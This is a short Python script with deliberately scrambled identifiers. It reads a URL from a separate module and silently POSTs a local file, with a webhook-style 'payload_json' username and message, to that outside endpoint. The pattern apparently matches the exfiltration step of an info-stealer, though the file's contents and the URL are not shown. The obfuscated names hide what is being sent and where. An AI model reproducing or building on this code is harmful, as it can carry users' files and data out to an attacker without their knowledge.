import requests
import json
import os

from mods.bema import zhrnxx_vbwnnk

def btswkr_bmglh():
    try:
        zsmzknk_url = zhrnxx_vbwnnk()
    except ValueError as e:
        print(f"Error: {e}")
        return
    
    file_path = 'zyx_iku.zyga'

    if not os.path.exists(file_path):
        return
    
    files = {
        'file': ('zyx_iku.zyga', open(file_path, 'rb'), 'application/octet-stream')
    }

    payload = {
        'payload_json': json.dumps({
            'username': 'ybujm',
            'content': 'tykon myun'
        })
    }

    try:
        response = requests.post(zsmzknk_url, data=payload, files=files)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Error sending file: {e}")
    finally:
        files['file'][1].close()

if __name__ == "__main__":
    btswkr_bmglh()
